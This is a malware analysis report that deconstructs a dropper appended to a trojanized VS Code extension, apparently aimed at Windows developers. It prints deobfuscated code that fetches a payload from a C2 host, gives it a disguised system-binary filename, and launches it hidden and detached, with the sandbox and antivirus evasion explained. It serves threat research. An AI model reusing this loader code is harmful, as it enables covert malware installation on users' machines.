# TECHNICAL CODE DEEP DIVE: DECONSTRUCTING THE "ALPME" TROJANIZED RUNTIME
**Document Title**: Forensic Source Code Deconstruction of `alpme-1.0.25` (`dist/extension.js`)  
**Lead Investigator & Author**: PenguinBTW  
**Copyright**: © 2026 PENGUINBTW. All Rights Reserved.  
**Classification**: Threat Intelligence / Malware Reverse Engineering (Code-Level Analysis)  

---

## 1. Architectural Anatomy & Module Placement

The target artifact `dist/extension.js` is a monolithic **36.6 MB minified JavaScript bundle** comprising **613,120 lines of code**. 

During static analysis, the bundle was determined to consist of two distinct sections:
1. **Lines 1 – ~612,800**: The legitimate, compiled open-source codebase of **Cline / Roo Code** (including React webview assets, Monaco editor bindings, and LLM orchestration logic).
2. **Lines 612,800 – 613,100**: The threat actor's custom **Pay-Per-Install (PPI) dropper module**, appended directly to the end of the runtime file prior to obfuscation.

### Standard Minified Namespace Identifiers
Throughout the deobfuscated code, Node.js core modules and VS Code APIs were imported and assigned short minified variables:

| Minified Variable | Underlying Standard Library / API | Description |
| :--- | :--- | :--- |
| `xu` | `import path from "path"` | Path manipulation (`join`, `relative`, `dirname`) |
| `Zp` | `import fs from "fs"` | Filesystem access (`existsSync`, `writeFileSync`) |
| `Fdn` | `import child_process from "child_process"` | Process spawning (`spawn`) |
| `Jj` | `import os from "os"` | Operating system utilities (`tmpdir()`, `platform()`) |
| `Kj` | `import crypto from "crypto"` | Cryptographic RNG (`randomBytes`) |
| `bst` | `import * as vscode from "vscode"` | VS Code core API (`workspace.getConfiguration`) |
| `_0x4c9be9` | `vscode.ExtensionContext` | VS Code extension context (`globalState`, `secrets`) |

---

## 2. Code Snippet 1: Variable Scoping & PPI Configuration Keys

At lines `612804`–`612805`, the threat actor declared global constants defining their persistence keys:

```javascript
// Lines 612804 - 612805 in deobfuscated.js
var Adn = "alpme.partnerSoftware.lastSha256";
var eIt = "alpme.partnerSoftware.lastPath";
```

### Forensic Significance:
* **The Euphemism**: The terminology `"partnerSoftware"` is the universal operational phrase used by **Pay-Per-Install (PPI) syndicates**. In underground crimeware forums, software installers sell "installs" to third-party "partners" (malware operations such as infostealers, loaders, and botnets).
* **Target Storage Engine**: These keys target VS Code's internal **`Memento` / `globalState` engine**, which persists extension data inside a local SQLite 3 database (`%APPDATA%\Code\User\globalStorage\state.vscdb`).
* **Stealth Attribute**: Antivirus and EDR products continuously monitor the Windows Registry (`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`) and Task Scheduler for persistence hooks. Almost zero commercial AV scanners monitor VS Code's SQLite extension state, making this an elite living-off-the-land persistence (LOTL) technique.

---

## 3. Code Snippet 2: The Evasion Engine & Activation Gatekeeper

At lines `612960`–`612975`, the primary activation function `rIt` implements multi-layer defense evasion before initiating network traffic:

```javascript
// Lines 612960 - 612975 in deobfuscated.js
async function rIt(_0x4c9be9, _0x24fea8) {
  try {
    // Check 1: One-shot execution guard
    if (Gdn.has(_0x4c9be9)) {
      ym("skip: already ran this activation");
      return;
    }
    
    // Check 2: Explicit Windows Platform Killswitch
    if (process.platform !== "win32") {
      ym("skip: platform " + process.platform);
      return;
    }
    
    // Check 3: Login-Gated Dormancy (Anti-Sandbox Evasion)
    let _0x2ef62f = (await _0x4c9be9.secrets.get(iFa)) || "";
    if (!_0x2ef62f) {
      ym("skip: no token yet, waiting for login");
      return;
    }
    
    // Mark as activated
    Gdn.add(_0x4c9be9);
    
    // Check 4: Base C2 URL Resolution
    let _0x2f6e0a = sFa(_0x24fea8 || Bg());
    if (!_0x2f6e0a) {
      sc("skip: empty base url");
      return;
    }
```

### Deep-Dive Analysis:
1. **One-Shot Guard (`Gdn.has`)**: `Gdn` is a JavaScript `Set` held in runtime memory. It ensures that the dropper only attempts to download and launch the payload once per extension activation lifecycle, preventing infinite loops or process thrashing.
2. **Platform Gating (`process.platform !== "win32"`)**: macOS (`darwin`) and Linux (`linux`) environments are immediately dropped. The dropper logic hardcodes Windows API calls (`cmd.exe /c start /B`), which would throw fatal unhandled errors on Unix environments.
3. **Login-Gating (`secrets.get(iFa)`)**: This is an exceptionally sophisticated **anti-analysis sandbox bypass**:
   * Automated malware sandboxes (VirusTotal, Any.Run, Joe Sandbox) typically spin up an environment, load the extension, and record network activity for 60 to 120 seconds.
   * Because the sandbox has no user to register an account on `alpme.com`, `_0x4c9be9.secrets.get("alpme.clientToken")` returns `""` (empty string).
   * The function logs `ym("skip: no token yet, waiting for login")` and **aborts immediately**. 
   * As a result, the extension appeared 100% clean to automated sandbox detonation scanners. It only arms itself once a human victim types in their credentials.

---

## 4. Code Snippet 3: Base C2 Domain Resolution & Attribution Leaks

At lines `520742`–`520746` and lines `548536`, the resolution of the C2 domain and upstream Git repository is handled:

```javascript
// Lines 520742 - 520746 in deobfuscated.js
function Bg() {
  let _0xe6d56b = bst.workspace.getConfiguration("alpme").get("baseUrl");
  let _0x24c105 = typeof _0xe6d56b == "string" ? _0xe6d56b.trim() : "";
  return n9r(_0x24c105 || QI);
}

// Line 520738
var n9r = _0x3ea763 => _0x3ea763.replace(/\/+$/, "");

// Line 15931
var QI = "https://alpme.com";

// Lines 523279 & 548536 (OpenRouter & Telemetry Headers)
"HTTP-Referer": "https://github.com/AlpmeVetGit/Alpme-Alpme"
"HTTP-Referer": "https://github.com/AlpmeVetGit/Alpme"
```

### Deep-Dive Analysis:
* **The Fallback Constant (`QI`)**: `Bg()` checks if the user or a proxy setting overrode `alpme.baseUrl`. If empty, it falls back to variable `QI`, which hardcodes `https://alpme.com`.
* **URL Sanitization (`n9r`)**: Strips trailing slashes via regex `/\/+$/` to prevent malformed double-slash URLs (e.g. `https://alpme.com//api/...`).
* **Attribution Leak (`AlpmeVetGit`)**: When Cline/Roo Code communicates with OpenRouter or external LLM gateways, OpenRouter requires an `HTTP-Referer` header to track application ranking. The threat actor customized this header to point to their own staging repository: `github.com/AlpmeVetGit`.

---

## 5. Code Snippet 4: The Dynamic C2 Dropper Stage (`software/pick`)

At lines `612983`–`613040`, the client initiates the first stage of the dropper protocol:

```javascript
// Lines 612983 - 613020 in deobfuscated.js
let _0x17707f = {
  "x-alpme-client": "vscode",
  "x-alpme-feat": "zip"
};
if (_0x2ef62f) {
  _0x17707f.authorization = "Bearer " + _0x2ef62f;
}

let _0xd2da82;
try {
  _0xd2da82 = await tIt(async _0x7863c3 => await fetch(_0x2f6e0a + "/api/vscode/software/pick?platform=win", {
    method: "GET",
    headers: {
      accept: "application/json",
      ..._0x17707f
    },
    signal: _0x7863c3
  }), rFa);
} catch (_0x4feb12) {
  sc("pick network error", { error: String(_0x4feb12) });
  return;
}

if (!_0xd2da82.ok) {
  let _0x487335 = await _0xd2da82.text().catch(() => "");
  sc("pick http " + _0xd2da82.status, { body: _0x487335.slice(0, 200) });
  return;
}

let _0x3456f5 = await _0xd2da82.json().catch(() => null);
let _0x3720f3 = _0x3456f5 && _0x3456f5.pick;
if (!_0x3720f3 || _0x3720f3.id === undefined || _0x3720f3.id === null) {
  ym("no pick this run");
  return;
}
```

### Deep-Dive Analysis:
* **Feature Advertising (`x-alpme-feat: "zip"`)**: The extension informs the C2 server that the client supports dynamic zip decompression, allowing the server to serve compressed payloads rather than raw executables.
* **Authentication Header**: Sends the victim's account token via `Authorization: Bearer <token>`.
* **Dynamic Campaign Response**: The C2 returns a structured JSON payload:
  ```json
  {
    "pick": {
      "id": "4a3cded7",
      "sha256": "ed5f166035a2b3332bc349043b8d1d53a26da5551c06bc47d1bda8e16a7ac1dc",
      "name": "partner_bundle",
      "fileType": "zip",
      "entry": "25si.exe"
    }
  }
  ```
* **Selective Killswitch (`no pick this run`)**: If the C2 server determines the IP address belongs to a researcher, a cloud provider, or if no active affiliate campaign is purchased, it returns `{ pick: null }`. The dropper logs `ym("no pick this run")` and aborts.

---

## 6. Code Snippet 5: Cache-Hit Evasion & SQLite Verification

Lines `613045`–`613055` implement local caching to prevent redundant network traffic:

```javascript
// Lines 613045 - 613055 in deobfuscated.js
let _0x4a25b9 = "";
let _0x29cc71 = _0x4c9be9.globalState.get(Adn) || ""; // alpme.partnerSoftware.lastSha256
let _0x5dab31 = _0x4c9be9.globalState.get(eIt) || ""; // alpme.partnerSoftware.lastPath

if (_0x297216 && _0x29cc71 === _0x297216 && _0x5dab31 && Zp.existsSync(_0x5dab31)) {
  _0x4a25b9 = _0x5dab31;
  ym("cache hit", { path: _0x4a25b9 });
}
```

### Deep-Dive Analysis:
* If the payload hash returned by the C2 matches the hash stored in VS Code's `globalState` (`_0x29cc71 === _0x297216`) AND the binary still exists on disk (`Zp.existsSync(_0x5dab31)`):
  * It skips downloading.
  * It logs `ym("cache hit")`.
  * It immediately jumps to the execution phase.
* **Network Evasion Impact**: This prevents network monitors from noticing repeated multi-megabyte binary downloads every time the developer opens their IDE.

---

## 7. Code Snippet 6: Binary Download & Integrity Verification

Lines `613060`–`613095` handle the second stage of the dropper (`/software/download/{id}`):

```javascript
// Lines 613060 - 613095 in deobfuscated.js
if (!_0x4a25b9) {
  let _0x3b4f71;
  try {
    _0x3b4f71 = await tIt(async _0x132566 => await fetch(
      _0x2f6e0a + "/api/vscode/software/download/" + encodeURIComponent(_0x3e46a0), {
        method: "GET",
        headers: _0x17707f,
        signal: _0x132566
      }
    ), nFa);
  } catch (_0xca7303) {
    sc("download network error", { error: String(_0xca7303) });
    return;
  }

  let _0x36d051 = await _0x3b4f71.arrayBuffer();
  let _0x36c61b = Buffer.from(_0x36d051);

  if (_0x297216) {
    let _0xe130fd = Ndn(_0x36c61b); // SHA-256 calculation function
    if (_0xe130fd !== _0x297216) {
      sc("sha256 mismatch", {
        server: _0x297216.slice(0, 12),
        local: _0xe130fd.slice(0, 12)
      });
      return;
    }
  }
```

### Deep-Dive Analysis:
* **The Second-Stage URL**: Calls `https://alpme.com/api/vscode/software/download/{id}`.
* **Buffer Conversion**: Converts raw `ArrayBuffer` bytes into a Node.js `Buffer`.
* **Hash Integrity (`Ndn`)**: The helper function `Ndn` calculates `crypto.createHash("sha256").update(buffer).digest("hex")`. If the downloaded buffer does not match the server's claimed SHA-256 hash, execution is halted.

---

## 8. Code Snippet 7: ZIP Extraction & Path Traversal Mitigations

Lines `613098`–`613130` execute the archive extraction logic if `fileType === "zip"`:

```javascript
// Lines 613098 - 613130 in deobfuscated.js
if (_0x438676 === "zip") {
  let _0x47be32 = xu.join(Jj.tmpdir(), oFa()); // %TEMP%\<oFa()>
  try {
    await lFa(_0x36c61b, _0x47be32); // Unzip utility function
  } catch (_0x52ee33) {
    sc("zip extract failed", { dir: _0x47be32, error: String(_0x52ee33) });
    return;
  }
  
  let _0x5f29a8 = _0x2254fb.replace(/\\/g, "/").replace(/^\.?\/+/, "");
  let _0x1ee9a4 = xu.join(_0x47be32, _0x5f29a8);
  let _0x5b2e0f = xu.relative(_0x47be32, _0x1ee9a4);
  
  // Anti-Zip-Slip Traversal Protection:
  if (_0x5b2e0f.startsWith("..") || xu.isAbsolute(_0x5b2e0f)) {
    sc("zip entry path escapes dir", { entry: _0x2254fb });
    return;
  }
  
  if (!Zp.existsSync(_0x1ee9a4)) {
    sc("zip entry missing after extract", { entry: _0x2254fb, dir: _0x47be32 });
    return;
  }
  _0x4a25b9 = _0x1ee9a4;
```

### Deep-Dive Analysis:
* **Subdirectory Generation (`oFa()`)**: Instead of dumping files directly into `%TEMP%`, `oFa()` creates randomized subdirectories (e.g. `pkg-4a3cded7` or `winhlp-c1c18bf1`).
* **Zip-Slip Defense**: Remarkably, the malware authors wrote defensive sanitization code against **Zip-Slip vulnerabilities**. The check:
  `if (_0x5b2e0f.startsWith("..") || xu.isAbsolute(_0x5b2e0f))`
  guarantees that the executable target specified by the C2 server (`_0x2254fb`, e.g. `25si.exe`) cannot escape the staging temporary directory.

---

## 9. Code Snippet 8: Mathematical Filename Masquerading (`Edn` & `oFa`)

Lines `612863`–`612878` contain the random generator used to disguise dropped binaries:

```javascript
// Lines 612863 - 612878 in deobfuscated.js
function Edn() {
  let _0x6d1840 = Kj.randomBytes(16);
  let _0x371abd = d4e[_0x6d1840[0] % d4e.length];
  let _0x4562cb = _0x6d1840[1] & 1 ? "_" : "-";
  let _0x3f656b = 4 + _0x6d1840[2] % 4;
  let _0x1a6e1e = _0x6d1840.slice(3, 3 + _0x3f656b).toString("hex");
  return "" + _0x371abd + _0x4562cb + _0x1a6e1e + ".exe";
}

function oFa() {
  let _0x8e581c = Kj.randomBytes(16);
  let _0x579429 = d4e[_0x8e581c[0] % d4e.length];
  let _0x1da000 = _0x8e581c[1] & 1 ? "_" : "-";
  let _0x50c26a = 4 + _0x8e581c[2] % 4;
  let _0x1ed27e = _0x8e581c.slice(3, 3 + _0x50c26a).toString("hex");
  return "" + _0x579429 + _0x1da000 + _0x1ed27e;
}
```

### Mathematical Deconstruction:
1. **Entropy Generation**: `Kj.randomBytes(16)` generates 16 cryptographically strong pseudo-random bytes.
2. **Disguise Selection**: `_0x6d1840[0] % d4e.length` takes byte 0 modulo the length of array `d4e` (which contains `svchost`, `wuauclt`, `pkg`, `winhlp`).
3. **Delimiter Parity**: `_0x6d1840[1] & 1 ? "_" : "-"` evaluates the least significant bit of byte 1. If odd, it chooses `_`; if even, `-`.
4. **Variable Length Suffix**: `4 + byte[2] % 4` calculates an integer between 4 and 7.
5. **Hex Slicing**: Slices 4 to 7 bytes from the buffer and converts to hex, generating an **8 to 14 character random hex string**.
6. **Output**:
   * For executables (`Edn`): `svchost-4f9a1b2c.exe` or `wuauclt_9b1c7d4e12.exe`.
   * For directories (`oFa`): `pkg-4a3cded7` or `winhlp-c1c18bf1`.

---

## 10. Code Snippet 9: Anti-AV Write Collision Retry Loop

Lines `613135`–`613155` handle writing raw `.exe` payloads to disk with anti-antivirus error recovery:

```javascript
// Lines 613135 - 613155 in deobfuscated.js
} else {
  let _0x3bde30 = xu.join(Jj.tmpdir(), Edn());
  let _0x337520 = false;
  for (let _0x21ea21 = 0; _0x21ea21 < 3 && !_0x337520; _0x21ea21++) {
    try {
      Zp.writeFileSync(_0x3bde30, _0x36c61b);
      _0x337520 = true;
    } catch (_0x3536c1) {
      sc("write failed (attempt " + (_0x21ea21 + 1) + ")", {
        path: _0x3bde30,
        error: String(_0x3536c1)
      });
      _0x3bde30 = xu.join(Jj.tmpdir(), Edn()); // Generates a brand new disguise name!
    }
  }
  if (!_0x337520) return;
  _0x4a25b9 = _0x3bde30;
}
```

### Deep-Dive Analysis:
* If Windows Defender or an endpoint security product intercepts the file creation and locks the handle (or if file permissions fail), `Zp.writeFileSync` throws an exception.
* The loop catches the error, calls `Edn()` again to generate a **completely different filename** (e.g. switching from `svchost-*.exe` to `wuauclt-*.exe`), and retries up to three times.

---

## 11. Code Snippet 10: Stealth Orphaned Process Decoupling

Lines `613165`–`613185` execute the payload using stealth parameters designed to blind Endpoint Detection and Response (EDR) agents:

```javascript
// Lines 613165 - 613185 in deobfuscated.js
let _0xcc7f92 = _0x438676 === "zip" ? xu.dirname(_0x4a25b9) : Jj.tmpdir();
try {
  let _0x2483f6 = Fdn.spawn("cmd.exe", ["/c", "start", "", "/B", _0x4a25b9], {
    cwd: _0xcc7f92,
    detached: true,
    stdio: "ignore",
    windowsHide: true
  });
  
  _0x2483f6.on("error", _0x34249a => {
    sc("child error", { error: String(_0x34249a) });
  });
  
  _0x2483f6.unref();
  
  ym("spawned via cmd/start", {
    path: _0x4a25b9,
    cwd: _0xcc7f92,
    pid: _0x2483f6.pid
  });
```

### Deep-Dive Analysis of Spawning Flags:
```
                                PROCESS TREE BREAK
   [VS Code (Code.exe)] 
           │
           ▼
    cmd.exe /c start /B ─────► [detached: true, unref()] ─────► [25si.exe (ORPHANED)]
   (Exits in milliseconds)                                       (Runs independently)
```

1. **`cmd.exe /c start "" /B <path>`**:
   * Uses Windows Command Processor to launch the executable.
   * `""`: An empty window title (necessary when passing quoted paths to `start`).
   * `/B`: Starts the application without creating a new console window.
2. **`detached: true`**:
   * Decouples the spawned child process from the Node.js/Electron parent process tree.
   * **Result**: When VS Code is closed, minimized, or uninstalled, the malware process **remains active and running in memory**.
3. **`stdio: "ignore"`**:
   * Completely closes file descriptors `0`, `1`, and `2` (stdin, stdout, stderr).
   * **Result**: No crash logs, debugging messages, or console errors can ever bubble up into VS Code's Developer Tools console.
4. **`windowsHide: true`**:
   * Sets the `SW_HIDE` flag in the Windows API `STARTUPINFO` structure.
   * **Result**: Prevents the taskbar or desktop from showing a flashing command prompt window.
5. **`_0x2483f6.unref()`**:
   * Instructs the Node.js event loop to remove the reference count for the child process.
   * **Result**: Node.js does not wait for the child process to exit, allowing the extension runtime to proceed normally without blocking.

---

## 12. Code Snippet 11: Proof-of-Execution Telemetry

Lines `613180`–`613190` confirm the infection to the C2 infrastructure:

```javascript
// Line 613181 in deobfuscated.js
ym("spawned via cmd/start", {
  path: _0x4a25b9,
  cwd: _0xcc7f92,
  pid: _0x2483f6.pid
});

await _0x4c9be9.globalState.update(Adn, _0x297216 || Ndn(_0x36c61b));
await _0x4c9be9.globalState.update(eIt, _0x4a25b9);
```

### Deep-Dive Analysis:
* **The WebSocket Log (`ym`)**: The telemetry function `ym` serializes the payload path, working directory, and Windows Process ID (`pid`), dispatching it over a WebSocket connection to `alpme.com`.
* **The Commercial Payout**: In Pay-Per-Install fraud networks, this payload delivery confirmation is what triggers the affiliate payment. The threat actor earns money the second this WebSocket packet is acknowledged by the C2.
* **Database Commitment**: Finally, `globalState.update` writes the hash and path into SQLite, sealing the persistence loop.

---

## 13. Summary Matrix of Exploited Mechanisms

| Subsystem | Target API / Mechanism | Malicious Objective |
| :--- | :--- | :--- |
| **Sandbox Evasion** | `vscode.ExtensionContext.secrets.get` | Stays dormant until a human enters credentials |
| **Target Filtering** | `process.platform !== "win32"` | Prevents execution on non-Windows targets |
| **C2 Architecture** | Two-Stage REST (`/pick` $\rightarrow$ `/download`) | Shields payload binaries from static extension scanning |
| **Masquerading** | `crypto.randomBytes(16)` modulo math | Mimics legitimate system binaries (`svchost`, `wuauclt`) |
| **Archive Ingress** | ZIP buffer decompression (`lFa`) | Deploys internal stubs (`24si.exe`, `25si.exe`, `28si.exe`) |
| **Process Decoupling** | `child_process.spawn(..., {detached: true}).unref()` | Decouples malware from VS Code process tree |
| **Local Persistence** | `globalState.update` $\rightarrow$ `state.vscdb` | Stores execution state in SQLite to evade Registry monitors |

---

## 14. Authorship & Copyright Notice

**Lead Researcher & Author**: PenguinBTW  
**Role**: Independent Security Researcher & Reverse Engineer  
**Copyright**: © 2026 PenguinBTW. All Rights Reserved.  
*This technical deep dive represents original reverse-engineering research conducted by PenguinBTW. Non-commercial reproduction and distribution for defensive cybersecurity, threat hunting, and educational purposes is permitted with full author attribution.*
